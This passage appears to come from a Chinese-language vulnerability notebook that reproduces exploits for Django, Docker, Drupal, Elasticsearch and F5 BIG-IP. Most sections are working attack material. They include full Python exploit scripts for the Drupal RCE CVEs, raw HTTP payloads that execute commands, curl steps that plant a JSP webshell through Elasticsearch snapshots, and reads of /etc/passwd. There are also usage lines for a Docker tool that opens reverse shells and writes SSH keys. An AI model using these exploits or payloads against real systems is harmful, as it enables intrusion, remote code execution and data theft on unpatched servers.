    payload = &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;
    results = Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname=StringAgg(&#39;name&#39;, delimiter=payload))
    for e in results:
        print(e)



if __name__ == &#39;__main__&#39;:
    print(django.VERSION) # 测试版本 3.0.2
    initdb()
    query()
    query_with_evil()</code></pre><p><a href="https://github.com/ianxtianxt/CVE-2020-7471" target="_blank" rel="noopener">https://github.com/ianxtianxt/CVE-2020-7471</a></p>
<hr>
<h2 id="Django-Geo-sql注入（CVE-2020-9402）"><a href="#Django-Geo-sql注入（CVE-2020-9402）" class="headerlink" title="Django Geo sql注入（CVE-2020-9402）"></a><span id="CVE-2020-9402">Django Geo sql注入（CVE-2020-9402）</span></h2><p><a href="https://xz.aliyun.com/t/7403" target="_blank" rel="noopener">https://xz.aliyun.com/t/7403</a></p>
<hr>
<h2 id="docker-未授权访问"><a href="#docker-未授权访问" class="headerlink" title="docker 未授权访问"></a><span id="docker">docker 未授权访问</span></h2><ol>
<li>该未授权访问漏洞是因为docker remote api可以执行docker命令，该接口的目的是取代docker命令界面，通过url操作docker。docker swarm是用来管理docker集群的，在开放2375端口监听集群容器时，会调用这个api。</li>
<li><a href="https://github.com/Tycx2ry/docker_api_vul" target="_blank" rel="noopener">https://github.com/Tycx2ry/docker_api_vul</a></li>
</ol>
<pre><code>docker 未授权访问漏洞利用脚本
##安装类库
pip install -r requirements.txt
##查看运行的容器
python dockerRemoteApiGetRootShell.py -h IP -p 2375
##查看所有的容器
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -a
##查看所有镜像
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -l
##查看端口映射
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -L
##写计划任务（centos,redhat等,加-u参数用于ubuntu等）
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口
##写sshkey(自行修改脚本的中公钥)
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -C -i 镜像名 -k
##在容器中执行命令
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -e &quot;id&quot; -I 容器id
##删除容器
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -c -I 容器id
##修改client api版本
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -v 1.22
##查看服务端api版本
python dockerRemoteApiGetRootShell.py -h IP -p 2375 -V</code></pre><hr>
<h2 id="Drupal-lt-7-32-“Drupalgeddon”-sql注入（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-sql注入（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” sql注入（CVE-2014-3704）"></a><span id="CVE-2014-3704">Drupal &lt; 7.32 “Drupalgeddon” sql注入（CVE-2014-3704）</span></h2><ol>
<li>版本：Drupal 7.0~7.31</li>
<li>复现：</li>
</ol>
<pre><code>POST /?q=node&amp;destination=node HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a</code></pre><hr>
<h2 id="Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）"><a href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）" class="headerlink" title="Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）"></a><span id="CVE-2017-6920">Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</span></h2><p><a href="https://vulhub.org/#/environments/drupal/CVE-2017-6920/" target="_blank" rel="noopener">https://vulhub.org/#/environments/drupal/CVE-2017-6920/</a></p>
<hr>
<h2 id="Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）"></a><span id="CVE-2018-7600">Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</span></h2><ol>
<li>版本：Drupal7.58之前的版本，8.3.9之前的8.x版本，8.4.6之前的8.4.x版本，8.5.1之前的8.5.x版本。</li>
<li>复现：</li>
</ol>
<pre><code>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</code></pre><ol start="3">
<li>exploit.py</li>
</ol>
<pre><code>#!/usr/bin/env python3
import sys
import requests

print (&#39;################################################################&#39;)
print (&#39;# Proof-Of-Concept for CVE-2018-7600&#39;)
print (&#39;# by Vitalii Rudnykh&#39;)
print (&#39;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#39;)
print (&#39;# https://github.com/a2u/CVE-2018-7600&#39;)
print (&#39;################################################################&#39;)
print (&#39;Provided only for educational or information purposes\n&#39;)

target = input(&#39;Enter target url (example: https://domain.ltd/): &#39;)

# Add proxy support (eg. BURP to analyze HTTP(s) traffic)
# set verify = False if your proxy certificate is self signed
# remember to set proxies both for http and https
# 
# example:
# proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;: &#39;http://127.0.0.1:8080&#39;}
# verify = False
proxies = {}
verify = True

url = target + &#39;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#39; 
payload = {&#39;form_id&#39;: &#39;user_register_form&#39;, &#39;_drupal_ajax&#39;: &#39;1&#39;, &#39;mail[#post_render][]&#39;: &#39;exec&#39;, &#39;mail[#type]&#39;: &#39;markup&#39;, &#39;mail[#markup]&#39;: &#39;echo &quot;;-)&quot; | tee hello.txt&#39;}

r = requests.post(url, proxies=proxies, data=payload, verify=verify)
check = requests.get(target + &#39;hello.txt&#39;, proxies=proxies, verify=verify)
if check.status_code != 200:
  sys.exit(&quot;Not exploitable&quot;)
print (&#39;\nCheck: &#39;+target+&#39;hello.txt&#39;)</code></pre><hr>
<h2 id="Drupal-远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal-远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2018-7602）"></a><span id="CVE-2018-7602">Drupal 远程代码执行漏洞（CVE-2018-7602）</span></h2><ol>
<li>版本：Drupal 7.x版本和8.x</li>
<li>利用：<code>python3 drupa7-CVE-2018-7602.py -c &quot;id&quot; drupal drupal http://127.0.0.1:8081/</code> #”id”为要执行的命令 第一个drupal为用户名 第二个drupal为密码</li>
</ol>
<pre><code>#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

def get_args():
  parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7602.py&quot;,
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= &#39;&#39;&#39;
                    This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58
                    using an valid account and poisoning the cancel account form (user_cancel_confirm_form) 
                    with the &#39;destination&#39; variable and triggering it with the upload file via ajax (/file/ajax).
                    &#39;&#39;&#39;)

  parser.add_argument(&quot;user&quot;, help=&quot;Username&quot;)
  parser.add_argument(&quot;password&quot;, help=&quot;Password&quot;)
  parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)
  parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)
  parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)
  parser.add_argument(&quot;-x&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)
  args = parser.parse_args()
  return args

def pwn_target(target, username, password, function, command, proxy):
  requests.packages.urllib3.disable_warnings()
  session = requests.Session()
  proxyConf = {&#39;http&#39;: proxy, &#39;https&#39;: proxy}
  try:
    print(&#39;[*] Creating a session using the provided credential...&#39;)
    get_params = {&#39;q&#39;:&#39;user/login&#39;}
    post_params = {&#39;form_id&#39;:&#39;user_login&#39;, &#39;name&#39;: username, &#39;pass&#39; : password, &#39;op&#39;:&#39;Log in&#39;}
    print(&#39;[*] Finding User ID...&#39;)
    session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
    get_params = {&#39;q&#39;:&#39;user&#39;}
    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)
    user_id = soup.find(&#39;meta&#39;, {&#39;property&#39;: &#39;foaf:name&#39;}).get(&#39;about&#39;)
    if (&quot;?q=&quot; in user_id):
      user_id = user_id.split(&quot;=&quot;)[1]
    if(user_id):
      print(&#39;[*] User ID found: &#39; + user_id)
    print(&#39;[*] Poisoning a form using \&#39;destination\&#39; and including it in cache.&#39;)
    get_params = {&#39;q&#39;: user_id + &#39;/cancel&#39;}
    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)
    form = soup.find(&#39;form&#39;, {&#39;id&#39;: &#39;user-cancel-confirm-form&#39;})
    form_token = form.find(&#39;input&#39;, {&#39;name&#39;: &#39;form_token&#39;}).get(&#39;value&#39;)
    get_params = {&#39;q&#39;: user_id + &#39;/cancel&#39;, &#39;destination&#39; : user_id +&#39;/cancel?q[%23post_render][]=&#39; + function + &#39;&amp;q[%23type]=markup&amp;q[%23markup]=&#39; + command }
    post_params = {&#39;form_id&#39;:&#39;user_cancel_confirm_form&#39;,&#39;form_token&#39;: form_token, &#39;_triggering_element_name&#39;:&#39;form_id&#39;, &#39;op&#39;:&#39;Cancel account&#39;}
    r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)
    form = soup.find(&#39;form&#39;, {&#39;id&#39;: &#39;user-cancel-confirm-form&#39;})
    form_build_id = form.find(&#39;input&#39;, {&#39;name&#39;: &#39;form_build_id&#39;}).get(&#39;value&#39;)
    if form_build_id:
        print(&#39;[*] Poisoned form ID: &#39; + form_build_id)
        print(&#39;[*] Triggering exploit to execute: &#39; + command)
        get_params = {&#39;q&#39;:&#39;file/ajax/actions/cancel/#options/path/&#39; + form_build_id}
        post_params = {&#39;form_build_id&#39;:form_build_id}
        r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
        parsed_result = r.text.split(&#39;[{&quot;command&quot;:&quot;settings&quot;&#39;)[0]
        print(parsed_result)
  except:
    print(&quot;ERROR: Something went wrong.&quot;)
    raise

def main():
  print ()
  print (&#39;===================================================================================&#39;)
  print (&#39;|   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |&#39;)
  print (&#39;|                                   by pimps                                      |&#39;)
  print (&#39;===================================================================================\n&#39;)

  args = get_args() # get the cl args
  pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == &#39;__main__&#39;:
  main()</code></pre><hr>
<h2 id="Drupal-远程代码执行漏洞（CVE-2019-6339）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6339）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6339）"></a><span id="CVE-2019-6339">Drupal 远程代码执行漏洞（CVE-2019-6339）</span></h2><p><a href="https://vulhub.org/#/environments/drupal/CVE-2019-6339/" target="_blank" rel="noopener">https://vulhub.org/#/environments/drupal/CVE-2019-6339/</a></p>
<hr>
<h2 id="Drupal-远程代码执行漏洞（CVE-2019-6340）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6340）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6340）"></a><span id="CVE-2019-6340">Drupal 远程代码执行漏洞（CVE-2019-6340）</span></h2><ol>
<li>版本：Drupal 8.6.x &lt; 8.6.10、Drupal 8.5.x &lt; 8.5.11</li>
<li>POC</li>
</ol>
<pre><code>#!/usr/bin/env python3

# CVE-2019-6340 Drupal &lt;= 8.6.9 REST services RCE PoC
# 2019 @leonjza

# Technical details for this exploit is available at:
#   https://www.drupal.org/sa-core-2019-003
#   https://www.ambionics.io/blog/drupal8-rce
#   https://twitter.com/jcran/status/1099206271901798400

# Sample usage:
#
# $ python cve-2019-6340.py http://127.0.0.1/ &quot;ps auxf&quot;
# CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC
#  by @leonjza
#
# References:
#  https://www.drupal.org/sa-core-2019-003
#  https://www.ambionics.io/blog/drupal8-rce
#
# [warning] Caching heavily affects reliability of this exploit.
# Nodes are used as they are discovered, but once they are done,
# you will have to wait for cache expiry.
#
# Targeting http://127.0.0.1/...
# [+] Finding a usable node id...
# [x] Node enum found a cached article at: 2, skipping
# [x] Node enum found a cached article at: 3, skipping
# [+] Using node_id 4
# [+] Target appears to be vulnerable!
#
# USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# root        49  0.0  0.0   4288   716 pts/0    Ss+  16:38   0:00 sh
# root         1  0.0  1.4 390040 30540 ?        Ss   15:20   0:00 apache2 -DFOREGROUND
# www-data    24  0.1  2.8 395652 57912 ?        S    15:20   0:08 apache2 -DFOREGROUND
# www-data    27  0.1  2.9 396152 61108 ?        S    15:20   0:08 apache2 -DFOREGROUND
# www-data    31  0.0  3.4 406304 70408 ?        S    15:22   0:04 apache2 -DFOREGROUND
# www-data    39  0.0  2.7 398472 56852 ?        S    16:14   0:02 apache2 -DFOREGROUND
# www-data    44  0.2  3.2 402208 66080 ?        S    16:37   0:05 apache2 -DFOREGROUND
# www-data    56  0.0  2.6 397988 55060 ?        S    16:38   0:01 apache2 -DFOREGROUND
# www-data    65  0.0  2.3 394252 48460 ?        S    16:40   0:01 apache2 -DFOREGROUND
# www-data    78  0.0  2.5 400996 51320 ?        S    16:47   0:01 apache2 -DFOREGROUND
# www-data   117  0.0  0.0   4288   712 ?        S    17:20   0:00  \_ sh -c echo

import sys
from urllib.parse import urlparse, urljoin

import requests


def build_url(*args) -&gt; str:
    &quot;&quot;&quot;
        Builds a URL
    &quot;&quot;&quot;

    f = &#39;&#39;
    for x in args:
        f = urljoin(f, x)

    return f


def uri_valid(x: str) -&gt; bool:
    &quot;&quot;&quot;
        https://stackoverflow.com/a/38020041
    &quot;&quot;&quot;

    result = urlparse(x)
    return all([result.scheme, result.netloc, result.path])


def check_drupal_cache(r: requests.Response) -&gt; bool:
    &quot;&quot;&quot;
        Check if a response had the cache header.
    &quot;&quot;&quot;

    if &#39;X-Drupal-Cache&#39; in r.headers and r.headers[&#39;X-Drupal-Cache&#39;] == &#39;HIT&#39;:
        return True

    return False


def find_article(base: str, f: int = 1, l: int = 100):
    &quot;&quot;&quot;
        Find a target article that does not 404 and is not cached
    &quot;&quot;&quot;

    while f &lt; l:
        u = build_url(base, &#39;/node/&#39;, str(f))
        r = requests.get(u)

        if check_drupal_cache(r):
            print(f&#39;[x] Node enum found a cached article at: {f}, skipping&#39;)
            f += 1
            continue

        # found an article?
        if r.status_code == 200:
            return f
        f += 1


def check(base: str, node_id: int) -&gt; bool:
    &quot;&quot;&quot;
        Check if the target is vulnerable.
    &quot;&quot;&quot;

    payload = {
        &quot;_links&quot;: {
            &quot;type&quot;: {
                &quot;href&quot;: f&quot;{urljoin(base, &#39;/rest/type/node/INVALID_VALUE&#39;)}&quot;
            }
        },
        &quot;type&quot;: {
            &quot;target_id&quot;: &quot;article&quot;
        },
        &quot;title&quot;: {
            &quot;value&quot;: &quot;My Article&quot;
        },
        &quot;body&quot;: {
            &quot;value&quot;: &quot;&quot;
        }
    }

    u = build_url(base, &#39;/node/&#39;, str(node_id))
    r = requests.get(f&#39;{u}?_format=hal_json&#39;, json=payload, headers={&quot;Content-Type&quot;: &quot;application/hal+json&quot;})

    if check_drupal_cache(r):
        print(f&#39;Checking if node {node_id} is vuln returned cache HIT, ignoring&#39;)
        return False

    if &#39;INVALID_VALUE does not correspond to an entity on this site&#39; in r.text:
        return True

    return False


def exploit(base: str, node_id: int, cmd: str):
    &quot;&quot;&quot;
        Exploit using the Guzzle Gadgets
    &quot;&quot;&quot;

    # pad a easy search replace output:
    cmd = &#39;echo ---- &amp; &#39; + cmd
    payload = {
        &quot;link&quot;: [
            {
                &quot;value&quot;: &quot;link&quot;,
                &quot;options&quot;: &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:{s:33:\&quot;\u0000&quot;
                           &quot;GuzzleHttp\\Psr7\\FnStream\u0000methods\&quot;;a:1:{s:5:\&quot;&quot;
                           &quot;close\&quot;;a:2:{i:0;O:23:\&quot;GuzzleHttp\\HandlerStack\&quot;:3:&quot;
                           &quot;{s:32:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&quot;;&quot;
                           &quot;s:|size|:\&quot;|command|\&quot;;s:30:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000&quot;
                           &quot;stack\&quot;;a:1:{i:0;a:1:{i:0;s:6:\&quot;system\&quot;;}}s:31:\&quot;\u0000&quot;
                           &quot;GuzzleHttp\\HandlerStack\u0000cached\&quot;;b:0;}i:1;s:7:\&quot;&quot;
                           &quot;resolve\&quot;;}}s:9:\&quot;_fn_close\&quot;;a:2:{i:0;r:4;i:1;s:7:\&quot;resolve\&quot;;}}&quot;
                           &quot;&quot;.replace(&#39;|size|&#39;, str(len(cmd))).replace(&#39;|command|&#39;, cmd)
            }
        ],
        &quot;_links&quot;: {
            &quot;type&quot;: {
                &quot;href&quot;: f&quot;{urljoin(base, &#39;/rest/type/shortcut/default&#39;)}&quot;
            }
        }
    }

    u = build_url(base, &#39;/node/&#39;, str(node_id))
    r = requests.get(f&#39;{u}?_format=hal_json&#39;, json=payload, headers={&quot;Content-Type&quot;: &quot;application/hal+json&quot;})

    if check_drupal_cache(r):
        print(f&#39;Exploiting {node_id} returned cache HIT, may have failed&#39;)

    if &#39;----&#39; not in r.text:
        print(&#39;[warn] Command execution _may_ have failed&#39;)

    print(r.text.split(&#39;----&#39;)[1])


def main(base: str, cmd: str):
    &quot;&quot;&quot;
        Execute an OS command!
    &quot;&quot;&quot;

    print(&#39;[+] Finding a usable node id...&#39;)
    article = find_article(base)
    if not article:
        print(&#39;[!] Unable to find a node ID to reference. Check manually?&#39;)
        return

    print(f&#39;[+] Using node_id {article}&#39;)

    vuln = check(base, article)
    if not vuln:
        print(&#39;[!] Target does not appear to be vulnerable.&#39;)
        print(&#39;[!] It may also simply be a caching issue, so maybe just try again later.&#39;)
        return
    print(f&#39;[+] Target appears to be vulnerable!&#39;)

    exploit(base, article, cmd)


if __name__ == &#39;__main__&#39;:

    print(&#39;CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC&#39;)
    print(&#39; by @leonjza\n&#39;)
    print(&#39;References:\n&#39;
          &#39; https://www.drupal.org/sa-core-2019-003\n&#39;
          &#39; https://www.ambionics.io/blog/drupal8-rce\n&#39;)
    print(&#39;[warning] Caching heavily affects reliability of this exploit.\n&#39;
          &#39;Nodes are used as they are discovered, but once they are done,\n&#39;
          &#39;you will have to wait for cache expiry.\n&#39;)

    if len(sys.argv) &lt;= 2:
        print(f&#39;Usage: {sys.argv[0]} &lt;target base URL&gt; &lt;command&gt;&#39;)
        print(f&#39;    Example: {sys.argv[0]} http://127.0.0.1/ id&#39;)

    target = sys.argv[1]
    command = sys.argv[2]
    if not uri_valid(target):
        print(f&#39;Target {target} is not a valid URL&#39;)
        sys.exit(1)

    print(f&#39;Targeting {target}...&#39;)
    main(target, command)</code></pre><hr>
<h2 id="ElasticSearch-未授权访问"><a href="#ElasticSearch-未授权访问" class="headerlink" title="ElasticSearch 未授权访问"></a><span id="ElasticSearch">ElasticSearch 未授权访问</span></h2><ol>
<li>Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据。</li>
<li>目录穿越漏洞（CVE-2015-3337）<a href="https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/</a></li>
<li>目录穿越漏洞（CVE-2015-5531）<a href="https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/</a></li>
<li>写入webshell漏洞（WooYun-2015-110216）<a href="https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/</a></li>
</ol>
<pre><code>http://IP:9200/_plugin/head/  web管理界面
burpsuite重放：http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd
http://your-ip::9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
http://IP:9200/_cat/indices  查看集群当前状态
http://IP:9200/_nodes  查看节点数据
http://IP:9200/_river/_search  查看数据库敏感信息</code></pre><p><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/39.png" alt></p>
<hr>
<h2 id="Elasticsearch-1-5-x-后台getshell"><a href="#Elasticsearch-1-5-x-后台getshell" class="headerlink" title="Elasticsearch 1.5.x 后台getshell"></a><span id="Elasticsearch后台getshell">Elasticsearch 1.5.x 后台getshell</span></h2><ol>
<li><p>首先创建一个恶意索引文档</p>
<pre><code>curl -XPOST http://www.0-sec.org:9200/yz.jsp/yz.jsp/1 -d &#39;{&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;&quot;:&quot;test&quot;}&#39;</code></pre></li>
<li><p>再创建一个恶意的存储库，其中location的值即为我要写入的路径。</p>
<pre><code>curl -XPUT &#39;http://127.0.0.1:9200/_snapshot/yz.jsp&#39; -d &#39;{
  &quot;type&quot;: &quot;fs&quot;,
  &quot;settings&quot;: {
       &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,
       &quot;compress&quot;: false
  }
}&#39;</code></pre></li>
<li><p>存储库验证并创建:</p>
<pre><code>curl -XPUT &quot;http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#39;{
  &quot;indices&quot;: &quot;yz.jsp&quot;,
  &quot;ignore_unavailable&quot;: &quot;true&quot;,
  &quot;include_global_state&quot;: false
}&#39;</code></pre></li>
<li><p>访问<a href="http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的webshell。" target="_blank" rel="noopener">http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的webshell。</a></p>
</li>
<li><p>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：<a href="http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了" target="_blank" rel="noopener">http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了</a></p>
</li>
</ol>
<p><a href="https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/</a></p>
<hr>
<h2 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a><span id="CVE-2014-3120">ElasticSearch 命令执行漏洞（CVE-2014-3120）</span></h2><ol>
<li><a href="https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/</a></li>
<li>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</li>
</ol>
<pre><code>POST /website/blog/ HTTP/1.1
Host: IP:9200
...

{
    &quot;name&quot;:&quot;test&quot;
}</code></pre><ol>
<li>执行命令</li>
</ol>
<pre><code>POST /_search?pretty HTTP/1.1
Host: IP:9200
...

{
    &quot;size&quot;: 1,
    &quot;query&quot;: {
      &quot;filtered&quot;: {
        &quot;query&quot;: {
          &quot;match_all&quot;: {
          }
        }
      }
    },
    &quot;script_fields&quot;: {
        &quot;command&quot;: {
            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;
        }
    }
}</code></pre><hr>
<h2 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a><span id="CVE-2015-1427">ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</span></h2><ol>
<li>端口：9200</li>
<li><a href="https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/</a></li>
<li>MSF：exploit/multi/elasticsearch/search_groovy_script </li>
<li></li>
<li>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</li>
</ol>
<pre><code>POST /website/blog/ HTTP/1.1
Host: IP:9200
...

{
    &quot;name&quot;:&quot;test&quot;
}</code></pre><ol>
<li>再发送payload执行命令</li>
</ol>
<pre><code>POST /_search?pretty HTTP/1.1
Host: IP:9200
...

{&quot;size&quot;:1, &quot;script_fields&quot;: {&quot;lupin&quot;:{&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;}}}</code></pre><hr>
<h2 id="F5-BIG-IP-远程代码执行漏洞poc-exp（CVE-2020-5902）"><a href="#F5-BIG-IP-远程代码执行漏洞poc-exp（CVE-2020-5902）" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞poc exp（CVE-2020-5902）"></a><span id="F5_BIG-IP">F5 BIG-IP 远程代码执行漏洞poc exp（CVE-2020-5902）</span></h2><p><strong>POC</strong></p>
<pre><code>RCE: 
curl -v -k  &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;

Read File: 
curl -v -k  &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&#39;

写文件：/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/123.txt&amp;content=testtesttest
读文件：/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/123.txt</code></pre><p><strong>BurpSuite Request</strong></p>
<pre><code>GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50
Connection: close
Upgrade-Insecure-Requests: 1

</code></pre><pre><code>BurpSuite Requests
GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

</code></pre><p><strong>EXP</strong></p>
<pre><code>1. tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
2. fileSave.jsp?fileName=/tmp/cmd&amp;content=id
3. tmshCmd.jsp?command=list+/tmp/cmd
4. tmshCmd.jsp?command=delete+cli+alias+private+list</code></pre><hr>
<h2 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a>FCKeditor</h2><ol>
<li>查看FCKeditor版本<pre><code>http://127.0.0.1/fckeditor/editor/dialog/fck_about.html
http://127.0.0.1/FCKeditor/_whatsnew.html</code></pre></li>
<li>测试FCKeditor上传点</li>
